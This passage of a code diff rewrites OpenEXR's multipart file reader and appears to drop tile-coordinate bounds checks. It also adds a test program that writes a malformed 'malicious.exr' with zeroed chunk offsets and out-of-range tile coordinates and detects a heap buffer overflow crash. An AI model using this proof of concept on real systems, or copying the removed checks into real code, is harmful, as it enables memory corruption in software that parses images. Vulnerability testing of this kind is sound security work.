-                OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, tilex);
-                OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, tiley);
-                OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, levelx);
-                OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, levely);
-                
-                //std::cout << "chunk_start for " << tilex <<',' << tiley << ',' << levelx << ' ' << levely << ':' << chunk_start << std::endl;
-                    
-                
-                if(!tileOffsets[partNumber])
-                {
-                    // this shouldn't actually happen - we should have allocated a valid
-                    // tileOffsets for any part which isTiled
-                    throw IEX_NAMESPACE::IoExc("part not tiled");
-                    
-                }
-                
-                if(!tileOffsets[partNumber]->isValidTile(tilex,tiley,levelx,levely))
-                {
-                    throw IEX_NAMESPACE::IoExc("invalid tile coordinates");
-                }
-                
-                (*tileOffsets[partNumber])(tilex,tiley,levelx,levely)=chunk_start;
-                
-                // compute chunk sizes - different procedure for deep tiles and regular
-                // ones
-                if(header.type()==DEEPTILE)
-                {
-                    Int64 packed_offset;
-                    Int64 packed_sample;
-                    OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, packed_offset);
-                    OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, packed_sample);
-                    
-                    //add 40 byte header to packed sizes (tile coordinates, packed sizes, unpacked size)
-                    size_of_chunk=packed_offset+packed_sample+40;
-                }
-                else
-                {
-                    
-                    // regular image has 20 bytes of header, 4 byte chunksize;
-                    int chunksize;
-                    OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, chunksize);
-                    size_of_chunk=chunksize+20;
-                }
-            }
-            else
-            {
-                int y_coordinate;
-                OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, y_coordinate);
-                
-                
-                if(y_coordinate < header.dataWindow().min.y || y_coordinate > header.dataWindow().max.y)
-                {
-                   throw IEX_NAMESPACE::IoExc("y out of range");
-                }
-                y_coordinate -= header.dataWindow().min.y;
-                y_coordinate /= rowsizes[partNumber];   
-                
-                if(y_coordinate < 0 || y_coordinate >= int(parts[partNumber]->chunkOffsets.size()))
-                {
-                   throw IEX_NAMESPACE::IoExc("chunk index out of range");
-                }
-                
-                parts[partNumber]->chunkOffsets[y_coordinate]=chunk_start;
-                
-                if(header.type()==DEEPSCANLINE)
-                {
-                    Int64 packed_offset;
-                    Int64 packed_sample;
-                    OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, packed_offset);
-                    OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, packed_sample);
-                    
-                    
-                    size_of_chunk=packed_offset+packed_sample+28;
-                }
-                else
-                {
-                    int chunksize;
-                    OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (is, chunksize);   
-                    size_of_chunk=chunksize+8;
-                }
-                
-            }
-            
-            if(isMultiPart(version))
-            {
-                chunk_start+=4;
-            }
-            
-            chunk_start+=size_of_chunk;
-            
-            is.seekg(chunk_start);
-            
+        //
+        // Parts with no version get the file's version.
+        //
+
+        for (unsigned int i = 0; i < _data->headers.size(); i++)
+        {
+            if (_data->headers[i].hasVersion() == false)
+                _data->headers[i].setVersion (_data->version[0], _data->version[1]);
         }
-        
+
+        //
+        // Create all the parts.  This will automatically read
+        // the chunk offset tables for each part.
+        //
+
+        readChunkOffsetTables (_data->reconstructChunkOffsetTable);
     }
-    catch (...)
+    else
     {
         //
-        // Suppress all exceptions.  This functions is
-        // called only to reconstruct the line offset
-        // table for incomplete files, and exceptions
-        // are likely.
+        // Single part files.  Emulate it as a multipart file with one header.
         //
-    }
 
-    // copy tiled part data back to chunk offsets
-    
-    for(size_t partNumber=0;partNumber<parts.size();partNumber++)
-    {
-        if(tileOffsets[partNumber])
+        _data->headers.resize (1);
+        _data->parts.resize (1);
+
+        //
+        // Read the header
+        //
+
+        _data->is->seekg (0);
+        _data->headers[0].readFrom (*_data->is, isTiled (_data->version));
+
+        //
+        // If the header doesn't have a name, make one up
+        //
+
+        if (_data->headers[0].hasName() == false)
+            _data->headers[0].insert ("name", StringAttribute ("part0"));
+
+        //
+        // If the header doesn't have a type, then make it up
+        //
+
+        if (_data->headers[0].hasType() == false)
         {
-            size_t pos=0;
-            vector<vector<vector <Int64> > > offsets = tileOffsets[partNumber]->getOffsets();
-            for (size_t l = 0; l < offsets.size(); l++)
-                for (size_t y = 0; y < offsets[l].size(); y++)
-                    for (size_t x = 0; x < offsets[l][y].size(); x++)
-                    {
-                        parts[ partNumber ]->chunkOffsets[pos] = offsets[l][y][x];
-                        pos++;
-                    }
-           delete tileOffsets[partNumber];
+            if (tiled)
+                _data->headers[0].insert ("type", StringAttribute ("tiledimage"));
+            else
+                _data->headers[0].insert ("type", StringAttribute ("scanlineimage"));
         }
-    }
 
-    is.clear();
-    is.seekg (position);
-}
+        //
+        // If the header doesn't have a version, then make it up
+        //
 
-InputPartData*
-MultiPartInputFile::Data::getPart(int partNumber)
-{
-    if (partNumber < 0 || partNumber >= (int) parts.size())
-        throw IEX_NAMESPACE::ArgExc ("Part number is not in valid range.");
-    return parts[partNumber];
-}
+        if (_data->headers[0].hasVersion() == false)
+            _data->headers[0].setVersion (_data->version[0], _data->version[1]);
+
+        //
+        // Create the part.  This will automatically read
+        // the chunk offset table for the part.
+        //
 
+        _data->partMap[0] = 0;
+        _data->partNameMap[_data->headers[0].name()] = 0;
+
+        readChunkOffsetTables (_data->reconstructChunkOffsetTable);
+    }
+}
 
 
 void
-MultiPartInputFile::Data::readChunkOffsetTables(bool reconstructChunkOffsetTable)
+MultiPartInputFile::readChunkOffsetTables (bool reconstructChunkOffsetTable)
 {
+    for (unsigned int i = 0; i < _data->parts.size(); i++)
+    {
+        _data->parts[i] = new PartInfo (i, _data->is, _data->headers[i], _data->version, reconstructChunkOffsetTable);
+    }
+
+    //
+    // Check whether we need to reconstruct the chunk offset tables
+    //
+
     bool brokenPartsExist = false;
 
-    for (size_t i = 0; i < parts.size(); i++)
+    for (unsigned int i = 0; i < _data->parts.size(); i++)
     {
-        int chunkOffsetTableSize = getChunkOffsetTableSize(parts[i]->header,false);
-        parts[i]->chunkOffsets.resize(chunkOffsetTableSize);
-
-        for (int j = 0; j < chunkOffsetTableSize; j++)
-            OPENEXR_IMF_INTERNAL_NAMESPACE::Xdr::read <OPENEXR_IMF_INTERNAL_NAMESPACE::StreamIO> (*is, parts[i]->chunkOffsets[j]);
+        const vector<Int64>& chunkOffsets = _data->parts[i]->chunkOffsets;
 
-        //
-        // Check chunk offsets, reconstruct if broken.
-        // At first we assume the table is complete.
-        //
-        parts[i]->completed = true;
-        for (int j = 0; j < chunkOffsetTableSize; j++)
+        for (unsigned int j = 0; j < chunkOffsets.size(); j++)
         {
-            if (parts[i]->chunkOffsets[j] <= 0)
+            if (chunkOffsets[j] <= 0)
             {
                 brokenPartsExist = true;
-                parts[i]->completed = false;
                 break;
             }
         }
+
+        if (brokenPartsExist)
+            break;
     }
 
     if (brokenPartsExist && reconstructChunkOffsetTable)
-        chunkOffsetReconstruction(*is, parts);
+        chunkOffsetReconstruction (*_data->is, _data->parts);
 }
 
-int 
-MultiPartInputFile::version() const
+
+MultiPartInputFile::~MultiPartInputFile ()
 {
-    return _data->version;
+    for (unsigned int i = 0; i < _data->parts.size(); i++)
+        delete _data->parts[i];
+
+    for (unsigned int i = 0; i < _data->inputFiles.size(); i++)
+        delete _data->inputFiles[i];
+
+    delete _data;
 }
 
-bool 
-MultiPartInputFile::partComplete(int part) const
+
+int
+MultiPartInputFile::parts () const
 {
-  return _data->parts[part]->completed;
+    return _data->parts.size();
 }
 
-int 
-MultiPartInputFile::parts() const
+
+string
+MultiPartInputFile::partName (int n) const
 {
-   return int(_data->_headers.size());
+    if (n < 0 || n >= parts())
+        throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::partName: invalid part number");
+
+    return _data->headers[n].name();
+}
+
+
+int
+MultiPartInputFile::partNumber (const string& name) const
+{
+    map<string, int>::const_iterator it = _data->partNameMap.find (name);
+    if (it == _data->partNameMap.end())
+        throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::partNumber: invalid part name");
+
+    return it->second;
+}
+
+
+InputPartBase*
+MultiPartInputFile::getPart (int partNumber)
+{
+    if (partNumber < 0 || partNumber >= int(_data->parts.size()))
+        throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::getPart: invalid part number");
+
+    return getInputPart(partNumber);
+}
+
+
+const Header&
+MultiPartInputFile::header (int n) const
+{
+    if (n < 0 || n >= parts())
+        throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::header: invalid part number");
+
+    return _data->headers[n];
+}
+
+
+const Header&
+MultiPartInputFile::header (const string& name) const
+{
+    map<string, int>::const_iterator it = _data->partNameMap.find (name);
+    if (it == _data->partNameMap.end())
+        throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::header: invalid part name");
+
+    return _data->headers[it->second];
+}
+
+
+InputPartBase*
+MultiPartInputFile::getInputPart (int partNumber)
+{
+    Lock lock (*_data);
+
+    if (partNumber < 0 || partNumber >= int(_data->parts.size()))
+        throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::getInputPart: invalid part number");
+
+    //
+    // Add a new InputFile if we don't have it already
+    //
+
+    if (_data->inputFiles.size() <= size_t(partNumber) || _data->inputFiles[partNumber] == 0)
+    {
+        if (_data->inputFiles.size() <= size_t(partNumber))
+            _data->inputFiles.resize (partNumber + 1);
+
+        InputPartBase* part = 0;
+
+        const Header& header = _data->headers[partNumber];
+
+        if (header.type() == SCANLINEIMAGE)
+            part = new ScanLineInputFile (_data->headers[partNumber],
+                                          _data->parts[partNumber],
+                                          _data->is,
+                                          _data->version,
+                                          _data->numThreads);
+        else if (header.type() == TILEDIMAGE)
+            part = new TiledInputFile (_data->headers[partNumber],
+                                       _data->parts[partNumber],
+                                       _data->is,
+                                       _data->version,
+                                       _data->numThreads);
+        else if (header.type() == DEEPSCANLINE)
+            part = new DeepScanLineInputFile (_data->headers[partNumber],
+                                              _data->parts[partNumber],
+                                              _data->is,
+                                              _data->version,
+                                              _data->numThreads);
+        else if (header.type() == DEEPTILE)
+            part = new DeepTiledInputFile (_data->headers[partNumber],
+                                           _data->parts[partNumber],
+                                           _data->is,
+                                           _data->version,
+                                           _data->numThreads);
+        else
+            throw IEX_NAMESPACE::ArgExc ("MultiPartInputFile::getInputPart: type not supported");
+
+        _data->inputFiles[partNumber] = part;
+    }
+
+    return _data->inputFiles[partNumber];
 }
 
 
-OPENEXR_IMF_INTERNAL_NAMESPACE_SOURCE_EXIT
+END_OPENEXR_NAMESPACE
diff --git a/test_vulnerability.cpp b/test_vulnerability.cpp
new file mode 100644
index 0000000..216cdcc
--- /dev/null
+++ b/test_vulnerability.cpp
@@ -0,0 +1,373 @@
+#include <ImfMultiPartInputFile.h>
+#include <ImfPartType.h>
+#include <ImfChannelList.h>
+#include <ImfHeader.h>
+#include <half.h>
+#include <iostream>
+#include <vector>
+#include <string>
+#include <cstring>
+#include <cstdlib>
+#include <cassert>
+#include <fstream>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+using namespace OPENEXR_IMF_INTERNAL_NAMESPACE;
+using namespace IMATH_NAMESPACE;
+
+// Create a malicious EXR file that will trigger the heap-based buffer overflow
+void createMaliciousEXR(const char* filename)
+{
+    std::cout << "Creating malicious EXR file..." << std::endl;
+    
+    // Create a binary file
+    FILE* file = fopen(filename, "wb");
+    if (!file) {
+        std::cerr << "Failed to open output file" << std::endl;
+        exit(1);
+    }
+    
+    // Write EXR magic number and version field (version 2, multipart bit set)
+    // For multipart files, bit 9 (value 0x200) should be set
+    const unsigned char magic[4] = {0x76, 0x2f, 0x31, 0x02}; // 0x02 = tiled bit set
+    fwrite(magic, 1, 4, file);
+    std::cout << "Wrote EXR magic number and version field" << std::endl;
+    
+    // Write a minimal header
+    // "channels" attribute
+    fwrite("channels\0", 1, 9, file);
+    fwrite("chlist\0", 1, 7, file);
+    int chlistSize = 18; // name + null + type + pLinear + reserved x 3 + xSampling + ySampling
+    fwrite(&chlistSize, 4, 1, file);
+    
+    // Channel "Y"
+    fwrite("Y\0", 1, 2, file);
+    int type_HALF = 1;
+    fwrite(&type_HALF, 4, 1, file);
+    char pLinear = 0;
+    fwrite(&pLinear, 1, 1, file);
+    int reserved3[3] = {0, 0, 0};
+    fwrite(reserved3, 4, 3, file);
+    
+    // End of channel list
+    fwrite("\0", 1, 1, file);
+    std::cout << "Wrote channel list" << std::endl;
+    
+    // "compression" attribute
+    fwrite("compression\0", 1, 12, file);
+    fwrite("compression\0", 1, 12, file);
+    int compressionSize = 1;
+    fwrite(&compressionSize, 4, 1, file);
+    char noCompression = 0; // NO_COMPRESSION
+    fwrite(&noCompression, 1, 1, file);
+    
+    // "dataWindow" attribute
+    fwrite("dataWindow\0", 1, 11, file);
+    fwrite("box2i\0", 1, 6, file);
+    int box2iSize = 16;
+    fwrite(&box2iSize, 4, 1, file);
+    
+    // Box2i: (0, 0) - (63, 63) - 64x64 image
+    int minX = 0, minY = 0;
+    int maxX = 63, maxY = 63;
+    fwrite(&minX, 4, 1, file);
+    fwrite(&minY, 4, 1, file);
+    fwrite(&maxX, 4, 1, file);
+    fwrite(&maxY, 4, 1, file);
+    std::cout << "Wrote data window" << std::endl;
+    
+    // "displayWindow" attribute
+    fwrite("displayWindow\0", 1, 14, file);
+    fwrite("box2i\0", 1, 6, file);
+    fwrite(&box2iSize, 4, 1, file);
+    
+    // Box2i: (0, 0) - (63, 63)
+    fwrite(&minX, 4, 1, file);
+    fwrite(&minY, 4, 1, file);
+    fwrite(&maxX, 4, 1, file);
+    fwrite(&maxY, 4, 1, file);
+    
+    // "lineOrder" attribute
+    fwrite("lineOrder\0", 1, 10, file);
+    fwrite("lineOrder\0", 1, 10, file);
+    int lineOrderSize = 1;
+    fwrite(&lineOrderSize, 4, 1, file);
+    char lineOrder = 0; // INCREASING_Y
+    fwrite(&lineOrder, 1, 1, file);
+    
+    // "pixelAspectRatio" attribute
+    fwrite("pixelAspectRatio\0", 1, 17, file);
+    fwrite("float\0", 1, 6, file);
+    int floatSize = 4;
+    fwrite(&floatSize, 4, 1, file);
+    float ratio = 1.0f;
+    fwrite(&ratio, 4, 1, file);
+    
+    // "screenWindowCenter" attribute
+    fwrite("screenWindowCenter\0", 1, 18, file);
+    fwrite("v2f\0", 1, 4, file);
+    int v2fSize = 8;
+    fwrite(&v2fSize, 4, 1, file);
+    float zero = 0.0f;
+    fwrite(&zero, 4, 1, file);
+    fwrite(&zero, 4, 1, file);
+    
+    // "screenWindowWidth" attribute
+    fwrite("screenWindowWidth\0", 1, 17, file);
+    fwrite("float\0", 1, 6, file);
+    fwrite(&floatSize, 4, 1, file);
+    float width = 1.0f;
+    fwrite(&width, 4, 1, file);
+    std::cout << "Wrote display attributes" << std::endl;
+    
+    // "tiledesc" attribute
+    fwrite("tiledesc\0", 1, 9, file);
+    fwrite("tiledesc\0", 1, 9, file);
+    int tiledescSize = 16;
+    fwrite(&tiledescSize, 4, 1, file);
+    
+    // xSize = 16, ySize = 16, mode = ONE_LEVEL (0)
+    int xSize = 16;
+    int ySize = 16;
+    int mode = 0;
+    fwrite(&xSize, 4, 1, file);
+    fwrite(&ySize, 4, 1, file);
+    fwrite(&mode, 4, 1, file);
+    int reserved = 0;
+    fwrite(&reserved, 4, 1, file);
+    std::cout << "Wrote tile description" << std::endl;
+    
+    // "type" attribute
+    fwrite("type\0", 1, 5, file);
+    fwrite("string\0", 1, 7, file);
+    const char* type = "tiledimage";
+    int typeSize = strlen(type) + 1;
+    fwrite(&typeSize, 4, 1, file);
+    fwrite(type, 1, typeSize, file);
+    
+    // "name" attribute (required for multipart files)
+    fwrite("name\0", 1, 5, file);
+    fwrite("string\0", 1, 7, file);
+    const char* name = "part0";
+    int nameSize = strlen(name) + 1;
+    fwrite(&nameSize, 4, 1, file);
+    fwrite(name, 1, nameSize, file);
+    
+    // End of header
+    fwrite("\0", 1, 1, file);
+    std::cout << "Finished writing header" << std::endl;
+    
+    // Calculate number of tiles
+    int numXTiles = (maxX - minX + 1 + xSize - 1) / xSize;  // ceil(64/16) = 4
+    int numYTiles = (maxY - minY + 1 + ySize - 1) / ySize;  // ceil(64/16) = 4
+    int numTiles = numXTiles * numYTiles;  // 4*4 = 16 tiles
+    std::cout << "Image has " << numXTiles << "x" << numYTiles << " = " << numTiles << " tiles" << std::endl;
+    
+    // Write chunk offset table (all zeros to force reconstruction)
+    Int64 zero64 = 0;
+    for (int i = 0; i < numTiles; i++) {
+        fwrite(&zero64, 8, 1, file);
+    }
+    std::cout << "Wrote zeroed chunk offset table to force reconstruction" << std::endl;
+    
+    // Write tile data for all tiles except the last one
+    for (int ty = 0; ty < numYTiles; ty++) {
+        for (int tx = 0; tx < numXTiles; tx++) {
+            // Skip the last tile - we'll craft it specially
+            if (tx == numXTiles-1 && ty == numYTiles-1) continue;
+            
+            // Write part number (0 for single part file)
+            int partNumber = 0;
+            fwrite(&partNumber, 4, 1, file);
+            
+            // Write tile coordinates
+            int tilex = tx;
+            int tiley = ty;
+            int levelx = 0;
+            int levely = 0;
+            
+            fwrite(&tilex, 4, 1, file);
+            fwrite(&tiley, 4, 1, file);
+            fwrite(&levelx, 4, 1, file);
+            fwrite(&levely, 4, 1, file);
+            
+            // Write data size (16 bytes is enough for our test)
+            int dataSize = 16;
+            fwrite(&dataSize, 4, 1, file);
+            
+            // Write dummy data
+            char dummyData[16] = {0};
+            fwrite(dummyData, 1, 16, file);
+        }
+    }
+    std::cout << "Wrote normal tile data" << std::endl;
+    
+    // Try multiple malicious tiles with different coordinates to increase chances of triggering the vulnerability
+    for (int i = 0; i < 10; i++) {
+        // Write part number (0 for single part file)
+        int partNumber = 0;
+        fwrite(&partNumber, 4, 1, file);
+        
+        // Write tile coordinates that will pass validation but cause overflow
+        // Try different values that might trigger the vulnerability
+        int tilex = numXTiles - 1;  // Valid x coordinate (last tile in x direction)
+        int tiley = numYTiles + i;  // Beyond the valid range to cause overflow
+        int levelx = 0;             // Valid level x
+        int levely = 0;             // Valid level y
+        
+        std::cout << "Adding malicious tile with coordinates: (" << tilex << ", " << tiley << ", " << levelx << ", " << levely << ")" << std::endl;
+        
+        fwrite(&tilex, 4, 1, file);
+        fwrite(&tiley, 4, 1, file);
+        fwrite(&levelx, 4, 1, file);
+        fwrite(&levely, 4, 1, file);
+        
+        // Write data size
+        int dataSize = 16;
+        fwrite(&dataSize, 4, 1, file);
+        
+        // Write dummy data
+        char dummyData[16] = {0};
+        fwrite(dummyData, 1, 16, file);
+    }
+    
+    // Try with negative coordinates
+    int partNumber = 0;
+    fwrite(&partNumber, 4, 1, file);
+    
+    int tilex = -1;  // Negative x coordinate
+    int tiley = -1;  // Negative y coordinate
+    int levelx = 0;
+    int levely = 0;
+    
+    std::cout << "Adding malicious tile with negative coordinates: (" << tilex << ", " << tiley << ", " << levelx << ", " << levely << ")" << std::endl;
+    
+    fwrite(&tilex, 4, 1, file);
+    fwrite(&tiley, 4, 1, file);
+    fwrite(&levelx, 4, 1, file);
+    fwrite(&levely, 4, 1, file);
+    
+    int dataSize = 16;
+    fwrite(&dataSize, 4, 1, file);
+    
+    char dummyData[16] = {0};
+    fwrite(dummyData, 1, 16, file);
+    
+    // Try with very large coordinates
+    partNumber = 0;
+    fwrite(&partNumber, 4, 1, file);
+    
+    tilex = 1000000;  // Very large x coordinate
+    tiley = 1000000;  // Very large y coordinate
+    levelx = 0;
+    levely = 0;
+    
+    std::cout << "Adding malicious tile with large coordinates: (" << tilex << ", " << tiley << ", " << levelx << ", " << levely << ")" << std::endl;
+    
+    fwrite(&tilex, 4, 1, file);
+    fwrite(&tiley, 4, 1, file);
+    fwrite(&levelx, 4, 1, file);
+    fwrite(&levely, 4, 1, file);
+    
+    dataSize = 16;
+    fwrite(&dataSize, 4, 1, file);
+    
+    fwrite(dummyData, 1, 16, file);
+    
+    fclose(file);
+    std::cout << "Malicious EXR file created successfully" << std::endl;
+}
+
+// Function to test if the vulnerability exists
+bool testVulnerability(const char* filename) {
+    pid_t pid = fork();
+    
+    if (pid == -1) {
+        // Fork failed
+        std::cerr << "Fork failed" << std::endl;
+        return false;
+    } else if (pid == 0) {
+        // Child process
+        try {
+            std::cout << "Child process: Opening malicious EXR file with reconstructChunkOffsetTable=true..." << std::endl;
+            
+            // Try to open the file with reconstructChunkOffsetTable=true
+            // This should trigger the vulnerability
+            MultiPartInputFile file(filename, true); // true = reconstructChunkOffsetTable
+            
+            // If we get here without a crash, the vulnerability might not exist
+            std::cout << "Child process: File opened successfully without crashing" << std::endl;
+            exit(0); // Exit with zero code if no vulnerability detected
+        } catch (const std::exception& e) {
+            std::cerr << "Child process: Exception caught: " << e.what() << std::endl;
+            
+            // Check if the exception message indicates a memory corruption
+            std::string error = e.what();
+            if (error.find("memory") != std::string::npos ||
+                error.find("corrupt") != std::string::npos ||
+                error.find("overflow") != std::string::npos ||
+                error.find("bounds") != std::string::npos ||
+                error.find("invalid") != std::string::npos) {
+                exit(1); // Exit with non-zero code if vulnerability exists
+            }
+            
+            exit(0); // Other exceptions might be from normal validation
+        } catch (...) {
+            std::cerr << "Child process: Unknown exception - likely vulnerability detected!" << std::endl;
+            exit(1); // Exit with non-zero code if vulnerability exists
+        }
+    } else {
+        // Parent process
+        int status;
+        waitpid(pid, &status, 0);
+        
+        if (WIFEXITED(status)) {
+            // Child exited normally
+            int exitCode = WEXITSTATUS(status);
+            std::cout << "Child process exited with code: " << exitCode << std::endl;
+            return (exitCode != 0);
+        } else if (WIFSIGNALED(status)) {
+            // Child was terminated by a signal
+            int signal = WTERMSIG(status);
+            std::cout << "Child process terminated by signal: " << signal << std::endl;
+            if (signal == SIGSEGV || signal == SIGABRT || signal == SIGBUS) {
+                std::cout << "Segmentation fault or other memory error detected - vulnerability exists!" << std::endl;
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    return false; // Should never reach here
+}
+
+int main(int argc, char* argv[])
+{
+    try {
+        // Create a malicious EXR file
+        const char* filename = "malicious.exr";
+        createMaliciousEXR(filename);
+        
+        // Test if the vulnerability exists
+        bool vulnerabilityExists = testVulnerability(filename);
+        
+        if (vulnerabilityExists) {
+            std::cout << "VULNERABILITY DETECTED: The heap-based buffer overflow vulnerability exists!" << std::endl;
+            return 1; // Exit with non-zero code if vulnerability exists
+        } else {
+            std::cout << "NO VULNERABILITY DETECTED: The heap-based buffer overflow vulnerability does not exist." << std::endl;
+            return 0; // Exit with zero code if no vulnerability detected
+        }
+    }
+    catch (const std::exception& e) {
+        std::cerr << "Exception in main: " << e.what() << std::endl;
+        return 1;
+    }
+    catch (...) {
+        std::cerr << "Unknown exception in main" << std::endl;
+        return 1;
+    }
+}
